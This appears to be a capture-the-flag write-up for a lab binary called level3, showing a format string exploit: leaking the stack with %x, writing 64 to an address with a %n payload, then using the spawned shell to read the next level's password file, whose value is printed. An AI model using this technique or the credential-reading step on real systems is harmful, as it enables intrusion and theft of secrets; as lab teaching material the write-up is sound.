We can write in a buffer that will be printed with `printf`, and we know about format string exploit. \
Here are the first few steps to exploit a format string outside of gdb: \
```shell
$ # find where our buffer is written in memory:
$ echo "AAAA %x %x %x %x" | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141

$ # we know we need to write '64' at address '0x804888c', so we can use the `%n` modifier with 64 bytes before in the string to write to the address:
$ python -c 'print "\x8c\x88\x04\x08" + "\x90" * 60 + "%4$n"' > /tmp/exploit
                    |_ write 4b (addr)   |_ write 60 bytes

$ # the binary will execute system if the address 0x804888c contains "64", as we need to pipe into the binary we still need to keep stdin open to inject commands or the shell will exit prematurely:
$ cat /tmp/exploit - | ./level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

